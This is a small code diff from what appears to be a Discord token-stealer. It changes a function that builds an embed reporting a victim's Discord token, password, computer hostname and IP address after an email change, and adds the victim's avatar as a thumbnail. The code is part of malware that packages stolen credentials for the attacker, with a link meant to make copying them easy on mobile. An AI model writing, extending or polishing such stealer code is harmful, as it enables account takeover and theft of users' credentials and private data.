@@ -17,6 +17,7 @@ async function getUserEmailChangeEmbed(config, account = new fakeProfile_1.FakeA
     const token = account.discord.token;
     const des = `[**${constants_1.PARTNER_EMOJI} │ Click Here To Copy Info On Mobile**](${constants_1.COPY_ON_MOBILE}${token}<br>${password})`;
     embed.setDescription(des);
+    embed.setThumbnail(await account.discord.getAvatar());
     embed.setFields([{
             name: "Info",
             value: (0, utils_1.warpTripleQuote)(`Hostname: \n${account.computerName}\nIP: \n${account.discord.ip}`),
